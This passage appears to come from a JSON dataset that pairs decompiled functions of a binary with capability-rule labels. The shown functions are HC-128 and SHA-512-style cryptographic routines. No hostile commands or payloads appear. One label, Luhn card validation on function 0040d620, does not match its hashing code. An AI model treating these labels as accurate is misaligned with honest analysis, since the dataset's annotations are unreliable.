((*(arg_8h + 0x834 + uVar1 * 4) >> 9 | *(arg_8h + 0x834 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1064) >> 0x16 | *(arg_8h + 0x1064) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1040) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1040) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1070) = *(arg_8h + 0x830 + uVar1 * 4);\n        *(arg_8h + 0x834 + uVar1 * 4) =\n             *(arg_8h + 0x834 + uVar1 * 4) + (*(arg_8h + 0x104c) >> 0x18 | *(arg_8h + 0x104c) << 8) +\n             ((*(arg_8h + 0x838 + uVar1 * 4) >> 9 | *(arg_8h + 0x838 + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x1068) >> 0x16 | *(arg_8h + 0x1068) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1044) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1044) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1074) = *(arg_8h + 0x834 + uVar1 * 4);\n        *(arg_8h + 0x838 + uVar1 * 4) =\n             *(arg_8h + 0x838 + uVar1 * 4) + (*(arg_8h + 0x1050) >> 0x18 | *(arg_8h + 0x1050) << 8) +\n             ((*(arg_8h + 0x83c + uVar1 * 4) >> 9 | *(arg_8h + 0x83c + uVar1 * 4) << 0x17) ^\n             (*(arg_8h + 0x106c) >> 0x16 | *(arg_8h + 0x106c) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x1048) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x1048) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x1078) = *(arg_8h + 0x838 + uVar1 * 4);\n        *(arg_8h + 0x83c + uVar1 * 4) =\n             *(arg_8h + 0x83c + uVar1 * 4) + (*(arg_8h + 0x1054) >> 0x18 | *(arg_8h + 0x1054) << 8) +\n             ((*(arg_8h + 0x800 + uVar2 * 4) >> 9 | *(arg_8h + 0x800 + uVar2 * 4) << 0x17) ^\n             (*(arg_8h + 0x1070) >> 0x16 | *(arg_8h + 0x1070) << 10)) ^\n             *(arg_8h + *(arg_8h + 0x104c) * 4) + *(arg_8h + 0x400 + (*(arg_8h + 0x104c) >> 0x10 & 0xff) * 4);\n        *(arg_8h + 0x107c) = *(arg_8h + 0x83c + uVar1 * 4);\n    }\n    return;\n}\n",
        "token_count": 9305
    },
    "0040d620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_41ch\n\nvoid __cdecl fcn.0040d620(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t var_41ch;\n    uint var_418h;\n    uint32_t var_414h;\n    uint32_t var_410h;\n    uint32_t var_40ch;\n    uint32_t var_408h;\n    uint32_t var_404h;\n    uint32_t var_400h;\n    uint32_t var_3fch;\n    uint32_t var_3f8h;\n    uint32_t var_3f4h;\n    uint32_t var_3f0h;\n    uint32_t var_3ech;\n    uint32_t var_3e8h;\n    uint32_t var_3e4h;\n    uint32_t var_3e0h;\n    uint32_t var_3dch;\n    uint32_t var_3d8h;\n    uint32_t var_3d4h;\n    uint32_t var_3d0h;\n    uint32_t var_3cch;\n    uint32_t var_3c8h;\n    uint32_t var_3c4h;\n    uint32_t var_3c0h;\n    uint32_t var_3bch;\n    uint32_t var_3b8h;\n    uint32_t var_3b4h;\n    uint32_t var_3b0h;\n    uint32_t var_3ach;\n    uint32_t var_3a8h;\n    uint32_t var_3a4h;\n    uint32_t var_3a0h;\n    uint32_t var_39ch;\n    uint32_t var_398h;\n    uint32_t var_394h;\n    uint32_t var_390h;\n    uint32_t var_38ch;\n    uint32_t var_388h;\n    uint32_t var_384h;\n    uint32_t var_380h;\n    uint32_t var_37ch;\n    uint32_t var_378h;\n    uint32_t var_374h;\n    uint32_t var_370h;\n    uint32_t var_36ch;\n    uint32_t var_368h;\n    uint32_t var_364h;\n    uint32_t var_360h;\n    uint32_t var_35ch;\n    uint32_t var_358h;\n    uint32_t var_354h;\n    uint32_t var_350h;\n    uint32_t var_34ch;\n    uint32_t var_348h;\n    uint32_t var_344h;\n    uint32_t var_340h;\n    uint32_t var_33ch;\n    uint32_t var_338h;\n    uint32_t var_334h;\n    uint32_t var_330h;\n    uint32_t var_32ch;\n    uint32_t var_328h;\n    uint32_t var_324h;\n    uint32_t var_320h;\n    uint32_t var_31ch;\n    uint32_t var_318h;\n    uint32_t var_314h;\n    uint32_t var_310h;\n    uint32_t var_30ch;\n    uint var_308h;\n    uint32_t var_304h;\n    uint32_t var_300h;\n    uint32_t var_2fch;\n    int32_t var_2f8h;\n    uint32_t var_2f4h;\n    uint32_t var_2f0h;\n    uint32_t var_2ech;\n    uint32_t var_2e8h;\n    uint32_t var_2e4h;\n    uint32_t var_2e0h;\n    uint32_t var_2dch;\n    uint32_t var_2d8h;\n    uint32_t var_2d4h;\n    uint32_t var_2d0h;\n    uint32_t var_2cch;\n    uint32_t var_2c8h;\n    uint32_t var_2c4h;\n    uint32_t var_2c0h;\n    uint32_t var_2bch;\n    uint32_t var_2b8h;\n    uint32_t var_2b4h;\n    uint32_t var_2b0h;\n    uint32_t var_2ach;\n    int32_t var_2a8h;\n    uint32_t var_2a4h;\n    int32_t var_2a0h;\n    int32_t var_29ch;\n    uint32_t var_298h;\n    uint32_t var_294h;\n    uint32_t var_290h;\n    uint32_t var_28ch;\n    uint32_t var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    int32_t aiStack576 [142];\n    uint32_t var_4h;\n    \n    var_4h = *0x4110a4 ^ &stack0xfffffffc;\n    for (var_2a0h = 0; var_2a0h < 0x10; var_2a0h = var_2a0h + 1) {\n        uVar1 = *(arg_ch + 4 + var_2a0h * 8);\n        (&var_284h)[var_2a0h * 2] = *(arg_ch + var_2a0h * 8);\n        (&var_280h)[var_2a0h * 2] = uVar1;\n    }\n    for (var_2a0h = 0x10; var_2a0h < 0x50; var_2a0h = var_2a0h + 1) {\n        var_2fch = (&var_2f8h)[var_2a0h * 2] >> 7 | (&var_2fch)[var_2a0h * 2] << 0x19;\n        var_300h = (&var_2fch)[var_2a0h * 2] >> 7;\n        var_304h = ((&var_2f8h)[var_2a0h * 2] >> 1 | (&var_2fch)[var_2a0h * 2] << 0x1f) ^\n                   ((&var_2f8h)[var_2a0h * 2] >> 8 | (&var_2fch)[var_2a0h * 2] << 0x18) ^ var_2fch;\n        var_2f4h = var_304h +\n                   (((&var_290h)[var_2a0h * 2] >> 0x13 | (&var_294h)[var_2a0h * 2] << 0xd) ^\n                    ((&var_294h)[var_2a0h * 2] >> 0x1d | (&var_290h)[var_2a0h * 2] << 3) ^\n                   ((&var_290h)[var_2a0h * 2] >> 6 | (&var_294h)[var_2a0h * 2] << 0x1a));\n        var_3c8h = var_2f4h < var_304h;\n        var_41ch = (((&var_2fch)[var_2a0h * 2] >> 1 | (&var_2f8h)[var_2a0h * 2] << 0x1f) ^\n                    ((&var_2fch)[var_2a0h * 2] >> 8 | (&var_2f8h)[var_2a0h * 2] << 0x18) ^ var_300h) +\n                   (((&var_294h)[var_2a0h * 2] >> 0x13 | (&var_290h)[var_2a0h * 2] << 0xd) ^\n                    ((&var_290h)[var_2a0h * 2] >> 0x1d | (&var_294h)[var_2a0h * 2] << 3) ^\n                   (&var_294h)[var_2a0h * 2] >> 6) + var_3c8h;\n        var_2f4h = (&var_2b8h)[var_2a0h * 2] + var_2f4h;\n        var_3d4h = var_2f4h < (&var_2b8h)[var_2a0h * 2];\n        var_2f8h = (&var_2bch)[var_2a0h * 2] + var_41ch + var_3d4h;\n        (&var_280h)[var_2a0h * 2] = (&var_300h)[var_2a0h * 2] + var_2f4h;\n        var_3d8h = (&var_280h)[var_2a0h * 2] < (&var_300h)[var_2a0h * 2];\n        (&var_284h)[var_2a0h * 2] = (&var_304h)[var_2a0h * 2] + var_2f8h + var_3d8h;\n    }\n    var_2b8h = *arg_8h;\n    var_2b4h = arg_8h[1];\n    var_2c0h = arg_8h[2];\n    var_2bch = arg_8h[3];\n    var_2c8h = arg_8h[4];\n    var_2c4h = arg_8h[5];\n    var_2b0h = arg_8h[6];\n    var_2ach = arg_8h[7];\n    var_2d0h = arg_8h[8];\n    var_2cch = arg_8h[9];\n    var_2d8h = arg_8h[10];\n    var_2d4h = arg_8h[0xb];\n    var_2e0h = arg_8h[0xc];\n    var_2dch = arg_8h[0xd];\n    var_2e8h = arg_8h[0xe];\n    var_2e4h = arg_8h[0xf];\n    for (var_2a0h = 0; var_2a0h < 0x50; var_2a0h = var_2a0h + 8) {\n        uVar8 = ~var_2cch & var_2dch ^ var_2cch & var_2d4h;\n        uVar4 = uVar8 + ((var_2cch >> 0xe | var_2d0h << 0x12) ^ (var_2cch >> 0x12 | var_2d0h << 0xe) ^\n                        (var_2d0h >> 9 | var_2cch << 0x17));\n        var_3dch = uVar4 < uVar8;\n        uVar4 = *(var_2a0h * 8 + 0x40185c) + uVar4;\n        var_3e0h = uVar4 < *(var_2a0h * 8 + 0x40185c);\n        uVar4 = (&var_280h)[var_2a0h * 2] + uVar4;\n        var_3e4h = uVar4 < (&var_280h)[var_2a0h * 2];\n        uVar4 = var_2e4h + uVar4;\n        var_3e8h = uVar4 < var_2e4h;\n        iVar2 = var_2e8h +\n                (&var_284h)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401858) +\n                (~var_2d0h & var_2e0h ^ var_2d0h & var_2d8h) +\n                ((var_2d0h >> 0xe | var_2cch << 0x12) ^ (var_2d0h >> 0x12 | var_2cch << 0xe) ^\n                (var_2cch >> 9 | var_2d0h << 0x17)) + var_3dch + var_3e0h + var_3e4h + var_3e8h;\n        uVar8 = (var_2b4h >> 0x1c | var_2b8h << 4) ^ (var_2b8h >> 2 | var_2b4h << 0x1e) ^\n                (var_2b8h >> 7 | var_2b4h << 0x19);\n        uVar3 = uVar8 + (var_2b4h & var_2bch ^ var_2b4h & var_2c4h ^ var_2bch & var_2c4h);\n        var_3ech = uVar3 < uVar8;\n        uVar8 = var_2ach + uVar4;\n        var_3f4h = uVar8 < var_2ach;\n        var_3f4h = var_2b0h + iVar2 + var_3f4h;\n        uVar3 = uVar4 + uVar3;\n        var_370h = uVar3 < uVar4;\n        var_370h = iVar2 + ((var_2b8h >> 0x1c | var_2b4h << 4) ^ (var_2b4h >> 2 | var_2b8h << 0x1e) ^\n                           (var_2b4h >> 7 | var_2b8h << 0x19)) +\n                           (var_2b8h & var_2c0h ^ var_2b8h & var_2c8h ^ var_2c0h & var_2c8h) + var_3ech + var_370h;\n        uVar4 = ~uVar8 & var_2d4h ^ uVar8 & var_2cch;\n        uVar9 = uVar4 + ((uVar8 >> 0xe | var_3f4h * 0x40000) ^ (uVar8 >> 0x12 | var_3f4h * 0x4000) ^\n                        (var_3f4h >> 9 | uVar8 * 0x800000));\n        var_3f8h = uVar9 < uVar4;\n        uVar9 = *(var_2a0h * 8 + 0x401864) + uVar9;\n        var_3fch = uVar9 < *(var_2a0h * 8 + 0x401864);\n        uVar9 = (&var_278h)[var_2a0h * 2] + uVar9;\n        var_400h = uVar9 < (&var_278h)[var_2a0h * 2];\n        uVar9 = var_2dch + uVar9;\n        var_404h = uVar9 < var_2dch;\n        iVar2 = var_2e0h +\n                (&var_27ch)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401860) +\n                (~var_3f4h & var_2d8h ^ var_3f4h & var_2d0h) +\n                ((var_3f4h >> 0xe | uVar8 * 0x40000) ^ (var_3f4h >> 0x12 | uVar8 * 0x4000) ^\n                (uVar8 >> 9 | var_3f4h * 0x800000)) + var_3f8h + var_3fch + var_400h + var_404h;\n        uVar5 = (uVar3 >> 0x1c | var_370h * 0x10) ^ (var_370h >> 2 | uVar3 * 0x40000000) ^\n                (var_370h >> 7 | uVar3 * 0x2000000);\n        uVar4 = uVar5 + (uVar3 & var_2b4h ^ uVar3 & var_2bch ^ var_2b4h & var_2bch);\n        var_408h = uVar4 < uVar5;\n        uVar6 = var_2c4h + uVar9;\n        var_40ch = uVar6 < var_2c4h;\n        var_40ch = var_2c8h + iVar2 + var_40ch;\n        uVar4 = uVar9 + uVar4;\n        var_410h = uVar4 < uVar9;\n        var_410h = iVar2 + ((var_370h >> 0x1c | uVar3 * 0x10) ^ (uVar3 >> 2 | var_370h * 0x40000000) ^\n                           (uVar3 >> 7 | var_370h * 0x2000000)) +\n                           (var_370h & var_2b8h ^ var_370h & var_2c0h ^ var_2b8h & var_2c0h) + var_408h + var_410h;\n        uVar5 = ~uVar6 & var_2cch ^ uVar6 & uVar8;\n        uVar9 = uVar5 + ((uVar6 >> 0xe | var_40ch * 0x40000) ^ (uVar6 >> 0x12 | var_40ch * 0x4000) ^\n                        (var_40ch >> 9 | uVar6 * 0x800000));\n        var_30ch = uVar9 < uVar5;\n        uVar9 = *(var_2a0h * 8 + 0x40186c) + uVar9;\n        var_310h = uVar9 < *(var_2a0h * 8 + 0x40186c);\n        uVar9 = (&var_270h)[var_2a0h * 2] + uVar9;\n        var_314h = uVar9 < (&var_270h)[var_2a0h * 2];\n        uVar9 = var_2d4h + uVar9;\n        var_318h = uVar9 < var_2d4h;\n        iVar2 = var_2d8h +\n                (&var_274h)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401868) +\n                (~var_40ch & var_2d0h ^ var_40ch & var_3f4h) +\n                ((var_40ch >> 0xe | uVar6 * 0x40000) ^ (var_40ch >> 0x12 | uVar6 * 0x4000) ^\n                (uVar6 >> 9 | var_40ch * 0x800000)) + var_30ch + var_310h + var_314h + var_318h;\n        uVar5 = (uVar4 >> 0x1c | var_410h * 0x10) ^ (var_410h >> 2 | uVar4 * 0x40000000) ^\n                (var_410h >> 7 | uVar4 * 0x2000000);\n        uVar10 = uVar5 + (uVar4 & uVar3 ^ uVar4 & var_2b4h ^ uVar3 & var_2b4h);\n        var_31ch = uVar10 < uVar5;\n        uVar11 = var_2bch + uVar9;\n        var_320h = uVar11 < var_2bch;\n        var_320h = var_2c0h + iVar2 + var_320h;\n        uVar10 = uVar9 + uVar10;\n        var_324h = uVar10 < uVar9;\n        var_324h = iVar2 + ((var_410h >> 0x1c | uVar4 * 0x10) ^ (uVar4 >> 2 | var_410h * 0x40000000) ^\n                           (uVar4 >> 7 | var_410h * 0x2000000)) +\n                           (var_410h & var_370h ^ var_410h & var_2b8h ^ var_370h & var_2b8h) + var_31ch + var_324h;\n        uVar9 = ~uVar11 & uVar8 ^ uVar11 & uVar6;\n        uVar7 = uVar9 + ((uVar11 >> 0xe | var_320h * 0x40000) ^ (uVar11 >> 0x12 | var_320h * 0x4000) ^\n                        (var_320h >> 9 | uVar11 * 0x800000));\n        var_328h = uVar7 < uVar9;\n        uVar7 = *(var_2a0h * 8 + 0x401874) + uVar7;\n        var_32ch = uVar7 < *(var_2a0h * 8 + 0x401874);\n        uVar7 = (&var_268h)[var_2a0h * 2] + uVar7;\n        var_330h = uVar7 < (&var_268h)[var_2a0h * 2];\n        uVar7 = var_2cch + uVar7;\n        var_334h = uVar7 < var_2cch;\n        iVar2 = var_2d0h +\n                (&var_26ch)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401870) +\n                (~var_320h & var_3f4h ^ var_320h & var_40ch) +\n                ((var_320h >> 0xe | uVar11 * 0x40000) ^ (var_320h >> 0x12 | uVar11 * 0x4000) ^\n                (uVar11 >> 9 | var_320h * 0x800000)) + var_328h + var_32ch + var_330h + var_334h;\n        uVar9 = (uVar10 >> 0x1c | var_324h * 0x10) ^ (var_324h >> 2 | uVar10 * 0x40000000) ^\n                (var_324h >> 7 | uVar10 * 0x2000000);\n        uVar5 = uVar9 + (uVar10 & uVar4 ^ uVar10 & uVar3 ^ uVar4 & uVar3);\n        var_338h = uVar5 < uVar9;\n        uVar9 = var_2b4h + uVar7;\n        var_33ch = uVar9 < var_2b4h;\n        var_33ch = var_2b8h + iVar2 + var_33ch;\n        uVar5 = uVar7 + uVar5;\n        var_340h = uVar5 < uVar7;\n        var_340h = iVar2 + ((var_324h >> 0x1c | uVar10 * 0x10) ^ (uVar10 >> 2 | var_324h * 0x40000000) ^\n                           (uVar10 >> 7 | var_324h * 0x2000000)) +\n                           (var_324h & var_410h ^ var_324h & var_370h ^ var_410h & var_370h) + var_338h + var_340h;\n        uVar7 = ~uVar9 & uVar6 ^ uVar9 & uVar11;\n        uVar12 = uVar7 + ((uVar9 >> 0xe | var_33ch * 0x40000) ^ (uVar9 >> 0x12 | var_33ch * 0x4000) ^\n                         (var_33ch >> 9 | uVar9 * 0x800000));\n        var_344h = uVar12 < uVar7;\n        uVar12 = *(var_2a0h * 8 + 0x40187c) + uVar12;\n        var_348h = uVar12 < *(var_2a0h * 8 + 0x40187c);\n        uVar12 = (&var_260h)[var_2a0h * 2] + uVar12;\n        var_34ch = uVar12 < (&var_260h)[var_2a0h * 2];\n        uVar12 = uVar8 + uVar12;\n        var_350h = uVar12 < uVar8;\n        iVar2 = var_3f4h +\n                (&var_264h)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401878) +\n                (~var_33ch & var_40ch ^ var_33ch & var_320h) +\n                ((var_33ch >> 0xe | uVar9 * 0x40000) ^ (var_33ch >> 0x12 | uVar9 * 0x4000) ^\n                (uVar9 >> 9 | var_33ch * 0x800000)) + var_344h + var_348h + var_34ch + var_350h;\n        uVar8 = (uVar5 >> 0x1c | var_340h * 0x10) ^ (var_340h >> 2 | uVar5 * 0x40000000) ^\n                (var_340h >> 7 | uVar5 * 0x2000000);\n        var_2ach = uVar8 + (uVar5 & uVar10 ^ uVar5 & uVar4 ^ uVar10 & uVar4);\n        var_354h = var_2ach < uVar8;\n        var_2e4h = uVar3 + uVar12;\n        var_358h = var_2e4h < uVar3;\n        var_2e8h = var_370h + iVar2 + var_358h;\n        var_2ach = uVar12 + var_2ach;\n        var_35ch = var_2ach < uVar12;\n        var_2b0h = iVar2 + ((var_340h >> 0x1c | uVar5 * 0x10) ^ (uVar5 >> 2 | var_340h * 0x40000000) ^\n                           (uVar5 >> 7 | var_340h * 0x2000000)) +\n                           (var_340h & var_324h ^ var_340h & var_410h ^ var_324h & var_410h) + var_354h + var_35ch;\n        uVar3 = ~var_2e4h & uVar11 ^ var_2e4h & uVar9;\n        uVar8 = uVar3 + ((var_2e4h >> 0xe | var_2e8h * 0x40000) ^ (var_2e4h >> 0x12 | var_2e8h * 0x4000) ^\n                        (var_2e8h >> 9 | var_2e4h * 0x800000));\n        var_360h = uVar8 < uVar3;\n        uVar8 = *(var_2a0h * 8 + 0x401884) + uVar8;\n        var_364h = uVar8 < *(var_2a0h * 8 + 0x401884);\n        uVar8 = (&var_258h)[var_2a0h * 2] + uVar8;\n        var_368h = uVar8 < (&var_258h)[var_2a0h * 2];\n        uVar8 = uVar6 + uVar8;\n        var_36ch = uVar8 < uVar6;\n        iVar2 = var_40ch +\n                (&var_25ch)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401880) +\n                (~var_2e8h & var_320h ^ var_2e8h & var_33ch) +\n                ((var_2e8h >> 0xe | var_2e4h * 0x40000) ^ (var_2e8h >> 0x12 | var_2e4h * 0x4000) ^\n                (var_2e4h >> 9 | var_2e8h * 0x800000)) + var_360h + var_364h + var_368h + var_36ch;\n        uVar3 = (var_2ach >> 0x1c | var_2b0h * 0x10) ^ (var_2b0h >> 2 | var_2ach * 0x40000000) ^\n                (var_2b0h >> 7 | var_2ach * 0x2000000);\n        var_2c4h = uVar3 + (var_2ach & uVar5 ^ var_2ach & uVar10 ^ uVar5 & uVar10);\n        var_3f0h = var_2c4h < uVar3;\n        var_2dch = uVar4 + uVar8;\n        var_374h = var_2dch < uVar4;\n        var_2e0h = var_410h + iVar2 + var_374h;\n        var_2c4h = uVar8 + var_2c4h;\n        var_378h = var_2c4h < uVar8;\n        var_2c8h = iVar2 + ((var_2b0h >> 0x1c | var_2ach * 0x10) ^ (var_2ach >> 2 | var_2b0h * 0x40000000) ^\n                           (var_2ach >> 7 | var_2b0h * 0x2000000)) +\n                           (var_2b0h & var_340h ^ var_2b0h & var_324h ^ var_340h & var_324h) + var_3f0h + var_378h;\n        uVar8 = ~var_2dch & uVar9 ^ var_2dch & var_2e4h;\n        uVar3 = uVar8 + ((var_2dch >> 0xe | var_2e0h * 0x40000) ^ (var_2dch >> 0x12 | var_2e0h * 0x4000) ^\n                        (var_2e0h >> 9 | var_2dch * 0x800000));\n        var_37ch = uVar3 < uVar8;\n        uVar3 = *(var_2a0h * 8 + 0x40188c) + uVar3;\n        var_380h = uVar3 < *(var_2a0h * 8 + 0x40188c);\n        uVar3 = (&var_250h)[var_2a0h * 2] + uVar3;\n        var_384h = uVar3 < (&var_250h)[var_2a0h * 2];\n        uVar3 = uVar11 + uVar3;\n        var_388h = uVar3 < uVar11;\n        iVar2 = var_320h +\n                (&var_254h)[var_2a0h * 2] +\n                *(var_2a0h * 8 + 0x401888) +\n                (~var_2e0h & var_33ch ^ var_2e0h & var_2e8h) +\n                ((var_2e0h >> 0xe | var_2dch * 0x40000) ^ (var_2e0h >> 0x12 | var_2dch * 0x4000) ^\n                (var_2dch >> 9 | var_2e0h * 0x800000)) + var_37ch + var_380h + var_384h + var_388h;\n        uVar8 = (var_2c4h >> 0x1c | var_2c8h * 0x10) ^ (var_2c8h >> 2 | var_2c4h * 0x40000000) ^\n                (var_2c8h >> 7 | var_2c4h * 0x2000000);\n        var_2bch = uVar8 + (var_2c4h & var_2ach ^ var_2c4h & uVar5 ^ var_2ach & uVar5);\n        var_38ch = var_2bch < uVar8;\n        var_2d4h = uVar10 + uVar3;\n        var_390h = var_2d4h < uVar10;\n        var_2d8h = var_324h + iVar2 + var_390h;\n        var_2bch = uVar3 + var_2bch;\n        var_394h = var_2bch < uVar3;\n        var_2c0h = iVar2 + ((var_2c8h >> 0x1c | var_2c4h * 0x10) ^ (var_2c4h >> 2 | var_2c8h * 0x40000000) ^\n                           (var_2c4h >> 7 | var_2c8h * 0x2000000)) +\n                           (var_2c8h & var_2b0h ^ var_2c8h & var_340h ^ var_2b0h & var_340h) + var_38ch + var_394h;\n        uVar8 = ~var_2d4h & var_2e4h ^ var_2d4h & var_2dch;\n        var_2a4h = uVar8 + ((var_2d4h >> 0xe | var_2d8h * 0x40000) ^ (var_2d4h >> 0x12 | var_2d8h * 0x4000) ^\n                           (var_2d8h >> 9 | var_2d4h * 0x800000));\n        var_398h = var_2a4h < uVar8;\n        var_2a4h = *(var_2a0h * 8 + 0x401894) + var_2a4h;\n        var_39ch = var_2a4h < *(var_2a0h * 8 + 0x401894);\n        var_2a4h = (&var_248h)[var_2a0h * 2] + var_2a4h;\n        var_3a0h = var_2a4h < (&var_248h)[var_2a0h * 2];\n        var_2a4h = uVar9 + var_2a4h;\n        var_3a4h = var_2a4h < uVar9;\n        var_2a8h = var_33ch +\n                   (&var_24ch)[var_2a0h * 2] +\n                   *(var_2a0h * 8 + 0x401890) +\n                   (~var_2d8h & var_2e8h ^ var_2d8h & var_2e0h) +\n                   ((var_2d8h >> 0xe | var_2d4h * 0x40000) ^ (var_2d8h >> 0x12 | var_2d4h * 0x4000) ^\n                   (var_2d4h >> 9 | var_2d8h * 0x800000)) + var_398h + var_39ch + var_3a0h + var_3a4h;\n        uVar8 = (var_2bch >> 0x1c | var_2c0h * 0x10) ^ (var_2c0h >> 2 | var_2bch * 0x40000000) ^\n                (var_2c0h >> 7 | var_2bch * 0x2000000);\n        var_288h = var_2bch & var_2c4h ^ var_2bch & var_2ach ^ var_2c4h & var_2ach;\n        var_28ch = var_2c0h & var_2c8h ^ var_2c0h & var_2b0h ^ var_2c8h & var_2b0h;\n        var_298h = uVar8 + var_288h;\n        var_3a8h = var_298h < uVar8;\n        var_29ch = ((var_2c0h >> 0x1c | var_2bch * 0x10) ^ (var_2bch >> 2 | var_2c0h * 0x40000000) ^\n                   (var_2bch >> 7 | var_2c0h * 0x2000000)) + var_28ch + var_3a8h;\n        var_2cch = uVar5 + var_2a4h;\n        var_3ach = var_2cch < uVar5;\n        var_2d0h = var_340h + var_2a8h + var_3ach;\n        var_2b4h = var_2a4h + var_298h;\n        var_3b0h = var_2b4h < var_2a4h;\n        var_2b8h = var_2a8h + var_29ch + var_3b0h;\n        var_294h = var_2d0h;\n        var_290h = var_2cch;\n    }\n    arg_8h[1] = var_2b4h + arg_8h[1];\n    var_3b4h = arg_8h[1] < var_2b4h;\n    *arg_8h = var_2b8h + *arg_8h + var_3b4h;\n    arg_8h[3] = var_2bch + arg_8h[3];\n    var_3b8h = arg_8h[3] < var_2bch;\n    arg_8h[2] = var_2c0h + arg_8h[2] + var_3b8h;\n    arg_8h[5] = var_2c4h + arg_8h[5];\n    var_3bch = arg_8h[5] < var_2c4h;\n    arg_8h[4] = var_2c8h + arg_8h[4] + var_3bch;\n    arg_8h[7] = var_2ach + arg_8h[7];\n    var_3c0h = arg_8h[7] < var_2ach;\n    arg_8h[6] = var_2b0h + arg_8h[6] + var_3c0h;\n    arg_8h[9] = var_2cch + arg_8h[9];\n    var_3c4h = arg_8h[9] < var_2cch;\n    arg_8h[8] = var_2d0h + arg_8h[8] + var_3c4h;\n    arg_8h[0xb] = var_2d4h + arg_8h[0xb];\n    var_414h = arg_8h[0xb] < var_2d4h;\n    arg_8h[10] = var_2d8h + arg_8h[10] + var_414h;\n    arg_8h[0xd] = var_2dch + arg_8h[0xd];\n    var_3cch = arg_8h[0xd] < var_2dch;\n    arg_8h[0xc] = var_2e0h + arg_8h[0xc] + var_3cch;\n    var_2f0h = arg_8h[0xe];\n    var_2ech = arg_8h[0xf];\n    arg_8h[0xf] = var_2e4h + var_2ech;\n    var_3d0h = arg_8h[0xf] < var_2e4h;\n    arg_8h[0xe] = var_2e8h + var_2f0h + var_3d0h;\n    fcn.00410cf7(var_41ch);\n    return;\n}\n",
        "token_count": 9501
    },
    "00403d10": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00403d10(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00410da0();\n    fcn.00410d70((iVar1 >> 0x1f) >> 7);\n    return;\n}\n",
        "token_count": 101
    },
    "0040c810": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c810(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < *(arg_8h + 0x10c8) >> 5; var_4h = var_4h + 1) {\n        *(arg_8h + 0x10a4 + var_4h * 4) = *(arg_ch + var_4h * 4);\n    }\n    for (; var_4h < 8; var_4h = var_4h + 1) {\n        *(arg_8h + 0x10a4 + var_4h * 4) = *(arg_8h + 0x1094 + var_4h * 4);\n    }\n    for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) = *(arg_8h + 0x1084 + var_4h * 4);\n    }\n    for (var_4h = 8; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) = *(arg_8h + 0x1084 + var_4h * 4);\n    }\n    for (var_4h = 0x10; var_4h < 0x110; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) =\n             ((*(arg_8h + -8 + var_4h * 4) >> 0x11 | *(arg_8h + -8 + var_4h * 4) << 0xf) ^\n              (*(arg_8h + -8 + var_4h * 4) >> 0x13 | *(arg_8h + -8 + var_4h * 4) << 0xd) ^\n             *(arg_8h + -8 + var_4h * 4) >> 10) + *(arg_8h + -0x1c + var_4h * 4) +\n             ((*(arg_8h + -0x3c + var_4h * 4) >> 7 | *(arg_8h + -0x3c + var_4h * 4) << 0x19) ^\n              (*(arg_8h + -0x3c + var_4h * 4) >> 0x12 | *(arg_8h + -0x3c + var_4h * 4) << 0xe) ^\n             *(arg_8h + -0x3c + var_4h * 4) >> 3) + *(arg_8h + -0x40 + var_4h * 4) + var_4h;\n    }\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) = *(arg_8h + 0x400 + var_4h * 4);\n    }\n    for (var_4h = 0x10; var_4h < 0x400; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) =\n             ((*(arg_8h + -8 + var_4h * 4) >> 0x11 | *(arg_8h + -8 + var_4h * 4) << 0xf) ^\n              (*(arg_8h + -8 + var_4h * 4) >> 0x13 | *(arg_8h + -8 + var_4h * 4) << 0xd) ^\n             *(arg_8h + -8 + var_4h * 4) >> 10) + *(arg_8h + -0x1c + var_4h * 4) +\n             ((*(arg_8h + -0x3c + var_4h * 4) >> 7 | *(arg_8h + -0x3c + var_4h * 4) << 